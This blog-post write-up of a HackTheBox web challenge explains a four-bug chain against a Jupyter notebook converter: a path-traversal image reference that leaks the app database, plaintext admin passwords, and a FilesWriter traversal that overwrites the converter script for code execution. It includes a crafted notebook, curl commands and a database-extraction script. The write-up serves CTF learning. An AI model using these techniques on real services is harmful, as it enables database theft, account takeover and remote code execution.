---
title: "Notebook Converter Pro - HTB Web Challenge"
date: 2026-05-14 12:00:00 +0200
categories: [CTF, HackTheBox]
tags: [web, path-traversal, rce, python, htb]
image:
  path: /assets/img/posts/notebook/banner.png
---

I don't usually write writeups mid-coffee. But this one earned it.

Notebook Converter Pro is a HackTheBox web challenge that looks, at first 
glance, like a boring internal tool. You register, upload a Jupyter notebook, 
pick a format, and download the converted output. Clean UI. Nothing screaming 
"hack me." That's exactly what makes it interesting.

Four bugs chained together — no exploit frameworks, just Burp Suite, 
a Python script, and patience.

---

## First Impressions

![Login Page](/assets/img/posts/notebook/login.png)

The app lives at a single page. Register an account, log in, upload a `.ipynb` 
file, choose HTML or Markdown, get your converted output. There's also an admin 
panel — but only admins see it.

Source code came with the challenge. Directory structure:

```plaintext
app/
├── converter/
│   └── convert_job.py
├── routes/
│   ├── admin.py
│   ├── dashboard.py
│   └── public.py
├── services/
│   └── conversions.py
├── auth.py
├── db.py
└── settings.py
```

Also at the root: `readflag.c` — a SUID binary that reads `/root/flag.txt`. 
You can't just `cat` the flag. You have to execute `/readflag` as a privileged process.

---

## Bug 1 — Arbitrary File Read via embed_images

```python
def convert_html(input_path, output_dir):
    exporter = nbconvert.HTMLExporter()
    exporter.embed_images = True
    body, _resources = exporter.from_filename(str(input_path))
```

`embed_images = True` tells nbconvert to read every image referenced in the 
notebook from disk and base64-encode it inline into the HTML. Zero sanitization. 
Reference `../../../../data/app.db` and nbconvert reads your database and 
embeds it in the output. That's Bug 1.

---

## Bug 2 — Plaintext Password Storage

```python
admin_password = secrets.token_urlsafe(14)
conn.execute(
    "INSERT INTO users (username, password, role) VALUES (?, ?, ?)",
    ("admin", admin_password, "admin"),
)
```

Randomly generated — good. Stored as plaintext — very bad. 
Once you read the database, you read the admin password in cleartext.

---

## Bug 3 — Admin-Gated Asset Storage

```python
def determine_storage_mode(output_format):
    if output_format == "markdown":
        return "saved_assets" if setting_enabled("asset_storage_enabled") 
               else "single_file"
    return "single_file"
```

`saved_assets` activates `FilesWriter` — locked behind admin privilege 
because FilesWriter is where Bug 4 lives.

---

## Bug 4 — FilesWriter Path Traversal → RCE

`FilesWriter` joins `build_directory + attachment_key` with zero path 
traversal check. An attachment named 
`../../../../app/converter/convert_job.py` overwrites the actual converter. 
We control what runs on every future conversion. That's RCE.

---

## The Attack

### Step 1 — Steal the Database

![Steal notebook](/assets/img/posts/notebook/steal.png)

Craft this notebook:

```json
{
  "cells": [{
    "cell_type": "markdown",
    "metadata": {},
    "source": ["![x](../../../../data/app.db)"]
  }],
  "metadata": {
    "kernelspec": {
      "display_name": "Python 3",
      "language": "python",
      "name": "python3"
    },
    "language_info": {"name": "python", "version": "3.11.0"}
  },
  "nbformat": 4,
  "nbformat_minor": 4
}
```

Send it with `format=html`:

```bash
curl -X POST http://TARGET/convert \
  -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -F "notebook=@/tmp/steal.ipynb" \
  -F "format=html" \
  -o /tmp/r.html
```

![Curl response](/assets/img/posts/notebook/curl1.png)

Extract and decode the database:

```python
import re, base64
content = open('/tmp/db_out.html', 'rb').read().decode('utf-8', errors='replace')
matches = re.findall(r'data:[^;]*;base64,([A-Za-z0-9+/=]+)', content)
for m in matches:
    data = base64.b64decode(m)
    if data[:6] == b'SQLite':
        open('/tmp/stolen.db', 'wb').write(data)
```

Read the credentials:

```bash
sqlite3 /tmp/stolen.db "SELECT username, password, role FROM users;"
```

![SQLite output](/assets/img/posts/notebook/sqlite.png)

Admin password. Plaintext.

---

### Step 2 — Login as Admin and Enable Asset Storage

```bash
curl -X POST http://TARGET/admin \
  -c /tmp/admin.txt -b /tmp/admin.txt \
  -d "asset_storage_enabled=on"
```

![Admin panel](/assets/img/posts/notebook/admin.png)

FilesWriter is now armed.

---

### Step 3 — Overwrite the Converter

```bash
curl -X POST http://TARGET/convert \
  -c /tmp/admin.txt -b /tmp/admin.txt \
  -F "notebook=@/tmp/pwn.ipynb" \
  -F "format=markdown"
```

![PWN upload](/assets/img/posts/notebook/pwn.png)

FilesWriter resolves `build_directory + ../../../../app/converter/convert_job.py` 
and writes our malicious script over the real one.

---

### Step 4 — Trigger RCE and Get the Flag

```bash
curl -X POST http://154.57.164.68:32065/convert \
  -c /tmp/admin.txt -b /tmp/admin.txt \
  -F "notebook=@/tmp/steal.ipynb" \
  -F "format=html" \
  -o /tmp/r.html

cat /tmp/r.html

curl http://154.57.164.68:32065/jobs/bc1f61dvba73/download \
  -c /tmp/admin.txt -b /tmp/admin.txt \
  -o /tmp/flag.html
```

![Trigger RCE](/assets/img/posts/notebook/TriggerRce.png)

```bash
grep -o 'HTB{.*}' /tmp/flag.html
```

![Flag](/assets/img/posts/notebook/flag.png)

Flag captured. 

---

## Summary

| Bug | Description | Impact |
|-----|-------------|--------|
| 1 | `embed_images=True` no path check | Arbitrary file read |
| 2 | Plaintext password storage | Admin credentials |
| 3 | Admin-gated FilesWriter | Privilege needed |
| 4 | FilesWriter path traversal | Full RCE |

---

*If this helped, drop a follow — more writeups coming.* 🙌